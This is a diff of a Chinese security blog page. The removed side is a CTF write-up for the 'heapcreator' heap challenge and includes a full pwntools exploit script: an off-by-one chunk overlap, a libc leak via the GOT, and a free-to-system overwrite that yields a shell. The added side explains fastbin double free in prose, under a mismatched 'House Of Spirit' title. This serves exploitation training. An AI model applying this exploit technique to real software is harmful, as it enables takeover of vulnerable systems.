@@ -19,24 +19,24 @@
   <meta name="author" content="清风">
   <meta name="keywords" content="">
   
-    <meta name="description" content="堆利用_overlapping原理通过修改chunk中的size的大小，从而让块向前或后延申，与后面的块造成重叠，来对extend的块的内容进行操作 例题：heapcreator  这个程序有5个模块 creat_heap模块 这个模块是在heaparray+i处用malloc申请了一个堆块,并且是先构造了结构体再申请的  大小存在heaparray+i edit_heap模块这个模块可以对已创建">
+    <meta name="description" content="fastbin_attack_double_freeFastbin Attack简单的介绍一下，我们可以根据名字看出，这一类漏洞利用的方法主要基于fastbin机制的缺陷，其实fastbin attack并不是指某一种利用方法，而是一些。这类利用的前提是： 存在堆溢出、use-after-free等能控制chunk内容的漏洞漏洞发生于fastbin类型的chunk中如果细分的话，可以做如下的分类：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="堆利用_overlapping">
-<meta property="og:url" content="http://example.com/2024/10/05/%E5%A0%86%E5%88%A9%E7%94%A8-overlapping/index.html">
+<meta property="og:title" content="fastbin_House Of Spirit">
+<meta property="og:url" content="http://example.com/2024/10/06/fastbin-double-free/index.html">
 <meta property="og:site_name" content="清风不识字">
-<meta property="og:description" content="堆利用_overlapping原理通过修改chunk中的size的大小，从而让块向前或后延申，与后面的块造成重叠，来对extend的块的内容进行操作 例题：heapcreator  这个程序有5个模块 creat_heap模块 这个模块是在heaparray+i处用malloc申请了一个堆块,并且是先构造了结构体再申请的  大小存在heaparray+i edit_heap模块这个模块可以对已创建">
+<meta property="og:description" content="fastbin_attack_double_freeFastbin Attack简单的介绍一下，我们可以根据名字看出，这一类漏洞利用的方法主要基于fastbin机制的缺陷，其实fastbin attack并不是指某一种利用方法，而是一些。这类利用的前提是： 存在堆溢出、use-after-free等能控制chunk内容的漏洞漏洞发生于fastbin类型的chunk中如果细分的话，可以做如下的分类：">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/img/136.jpg">
-<meta property="article:published_time" content="2024-10-05T10:20:25.000Z">
-<meta property="article:modified_time" content="2024-10-05T13:32:15.613Z">
+<meta property="og:image" content="http://example.com/img/138.jpg">
+<meta property="article:published_time" content="2024-10-06T11:09:13.000Z">
+<meta property="article:modified_time" content="2024-10-06T11:12:03.574Z">
 <meta property="article:author" content="清风">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/img/136.jpg">
+<meta name="twitter:image" content="http://example.com/img/138.jpg">
   
   
   
-  <title>堆利用_overlapping - 清风不识字</title>
+  <title>fastbin_House Of Spirit - 清风不识字</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="堆利用_overlapping"></span>
+            <span id="subtitle" data-typed-text="fastbin_House Of Spirit"></span>
           
         </div>
 
@@ -214,8 +214,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-05 18:20" pubdate>
-          2024年10月5日 晚上
+        <time datetime="2024-10-06 19:09" pubdate>
+          2024年10月6日 晚上
         </time>
       </span>
     
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          721 字
+          371 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          7 分钟
+          4 分钟
         
       </span>
     
@@ -274,50 +274,26 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">堆利用_overlapping</h1>
+            <h1 id="seo-header">fastbin_House Of Spirit</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="堆利用-overlapping"><a href="#堆利用-overlapping" class="headerlink" title="堆利用_overlapping"></a>堆利用_overlapping</h1><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>通过修改chunk中的size的大小，从而让块向前或后延申，与后面的块造成重叠，来对extend的块的内容进行操作</p>
-<p>例题：<a target="_blank" rel="noopener" href="https://files.buuoj.cn/files/1f4895f785dd3e134c29823d904c9970/heapcreator">heapcreator</a></p>
-<p><img src="/img/overlapping/a" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>这个程序有5个模块</p>
-<h4 id="creat-heap模块"><a href="#creat-heap模块" class="headerlink" title="creat_heap模块"></a>creat_heap模块</h4><p><img src="/img/overlapping/b" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>这个模块是在heaparray+i处用malloc申请了一个堆块,并且是先构造了结构体再申请的</p>
-<p><img src="/img/overlapping/c" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>大小存在heaparray+i</p>
-<h4 id="edit-heap模块"><a href="#edit-heap模块" class="headerlink" title="edit_heap模块"></a>edit_heap模块</h4><p>这个模块可以对已创建的堆进行编辑</p>
-<p><img src="/img/overlapping/e" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/overlapping/f" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>可以看到这里在修改内容的时候，输入的大小比创建时多了1，造成了off_by_one漏洞</p>
-<h4 id="delete-heap模块"><a href="#delete-heap模块" class="headerlink" title="delete_heap模块"></a>delete_heap模块</h4><p><img src="/img/overlapping/g" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>这个模块比较的简单，输入index来删除对应的堆</p>
-<p><img src="/img/overlapping/h" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>因为这个是先free内容部分，再free掉结构体，如果我们把free改成system,内容输入&#x2F;bin&#x2F;sh即可getshell</p>
-<h4 id="show-heap模块"><a href="#show-heap模块" class="headerlink" title="show_heap模块"></a>show_heap模块</h4><p>这个模块为了打印堆的内容</p>
-<p><img src="/img/overlapping/i" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先我们先创建好第一个heap来部署&#x2F;bin&#x2F;sh,再运用off_by_one漏洞来造成overlapping</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>creat(<span class="hljs-number">24</span>,payload)<br>py2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span><br>creat(<span class="hljs-number">16</span>,py2)<br>py3=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>py3=py3.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+<span class="hljs-string">&#x27;\x41&#x27;</span><br>edit(<span class="hljs-number">0</span>,py3)<br>delete(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/overlapping/j" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>如果进行off_by_one的话可以修改下一个heap结构体的大小，来对下一个heap的内容部分extend</p>
-<p>然后我们释放掉再重启就可以对他的内容进行操作</p>
-<p>先随便重启一个heap</p>
-<p><img src="/img/overlapping/k" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>可以看到这个时候结构体是在内容的下面的</p>
-<p>那么我们就可以把结构体的地址覆盖成free来泄露libc</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">creat(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> +p64(<span class="hljs-number">0x30</span>) +  p64(free) <span class="hljs-comment">#</span><br>printf(<span class="hljs-number">1</span>)<br>real=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(real))<br>printf(<span class="hljs-number">1</span>)<br>base=real-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/overlapping/l" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/overlapping/m" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/overlapping/n" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>我们的edit_heap模块也是根据结构体来定位从而修改内容大小</p>
-<p>所以直接把内容修改为system即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/overlapping/o" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=process(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><span class="hljs-comment">#io=remote(&#x27;node5.buuoj.cn&#x27;,&#x27;27684&#x27;)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>free=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">creat</span>(<span class="hljs-params">size,payload</span>):<br>	io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(size))<br>	io.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>	io.sendline(payload)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>	io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(index))<br>	io.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>	io.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">index</span>):<br>	io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>	io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#gdb.attach(io)</span><br>payload=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>creat(<span class="hljs-number">24</span>,payload)<br>py2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span><br>creat(<span class="hljs-number">16</span>,py2)<br>py3=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>py3=py3.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+<span class="hljs-string">&#x27;\x41&#x27;</span><br>edit(<span class="hljs-number">0</span>,py3)<br>delete(<span class="hljs-number">1</span>)<br>creat(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> +p64(<span class="hljs-number">0x30</span>) +  p64(free)) <span class="hljs-comment">#</span><br>printf(<span class="hljs-number">1</span>)<br>real=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(real))<br>printf(<span class="hljs-number">1</span>)<br>base=real-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number">0</span>)<br>io.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>
+                <h1 id="fastbin-attack-double-free"><a href="#fastbin-attack-double-free" class="headerlink" title="fastbin_attack_double_free"></a><code>fastbin_attack_double_free</code></h1><h3 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a><code>Fastbin Attack</code></h3><p>简单的介绍一下，我们可以根据名字看出，这一类漏洞利用的方法主要基于fastbin机制的缺陷，其实fastbin attack并不是指某一种利用方法，而是一些。这类利用的前提是：</p>
+<p>存在堆溢出、use-after-free等能控制chunk内容的漏洞<br>漏洞发生于<code>fastbin</code>类型的chunk中<br>如果细分的话，可以做如下的分类：</p>
+<p><code>Fastbin Double Free</code><br><code>House of Spirit</code><br><code>Alloc to Stack</code><br><code>Arbitrary Alloc</code><br>前两种主要漏洞侧重于利用free函数释放的真的 chunk或伪造的chunk，然后再次申请chunk进行攻击，后两种侧重于故意修改<code>fd</code>指针，直接利用<code>malloc</code>申请指定位置chunk进行攻击。这篇文章主要讲解的是<code>Fastbin Double Free</code>，后几种会在之后文章中继续讲解</p>
+<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>1.<code>fastbin</code> 管理chunk是单链表管理</p>
+<p>2.由<code>fastbin</code>管理的chunk即使被释放，其next_chunk的<code>prev_inuse位也不会被清空</code></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>先创建3个chunk并free掉，可以看到三个chunk按单链表的形式进入<code>fastbin</code>,</p>
+<p><img src="/img/doublefree/a" srcset="/img/loading.gif" lazyload></p>
+<p><code>chunk3</code>的<code>fd</code>指针是指向<code>chunk2</code>的，<code>chunk2</code>的<code>fd</code>指针是指向<code>chunk1</code>,那么是谁来指向<code>chunk3</code>呢？</p>
+<p>其实是<strong>main_arena</strong>指向了<code>chunk3</code>的<code>prev_size</code></p>
+<p>并且free的验证只验证<strong>main_arena</strong>指向的chunk,</p>
+<p>也就是说<code>fastbin</code>中的<code>chunk1</code>是可以再次free的</p>
+<p><img src="/img/doublefree/b" srcset="/img/loading.gif" lazyload></p>
+<p>此时<code>chunk1</code>的<code>fd</code>指针是指向<code>chunk2</code>的，如果我们可以控制<code>chunk1</code>的<code>fd</code>指针，我们假设将指针指向一个在<code>bss</code>段的未free的chunk,在把三个chunk重新申请</p>
+<p><img src="/img/doublefree/c" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到，虽然<code>bss_chunk</code>没有free,但是<code>fastbin</code>还是把他当成free来用</p>
 
                 
               </div>
@@ -341,7 +317,7 @@
   
     <span>></span>
     
-  <a href="/categories/%E5%A0%86%E5%88%A9%E7%94%A8/python/" class="category-chain-item">python</a>
+  <a href="/categories/%E5%A0%86%E5%88%A9%E7%94%A8/fastbin/" class="category-chain-item">fastbin</a>
   
   
 
@@ -370,8 +346,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>堆利用_overlapping</div>
-      <div>http://example.com/2024/10/05/堆利用-overlapping/</div>
+      <div>fastbin_House Of Spirit</div>
+      <div>http://example.com/2024/10/06/fastbin-double-free/</div>
     </div>
     <div class="license-meta">
       
@@ -383,7 +359,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年10月5日</div>
+          <div>2024年10月6日</div>
         </div>
       
       
@@ -415,18 +391,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/06/fastbin-double-free/" title="fastbin_House Of Spirit">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">fastbin_House Of Spirit</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/04/fastbin_House%20Of%20Spirit/" title="fastbin_House Of Spirit">
-                        <span class="hidden-mobile">fastbin_House Of Spirit</span>
+                      <a href="/2024/10/05/%E5%A0%86%E5%88%A9%E7%94%A8-overlapping/" title="堆利用_overlapping">
+                        <span class="hidden-mobile">堆利用_overlapping</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
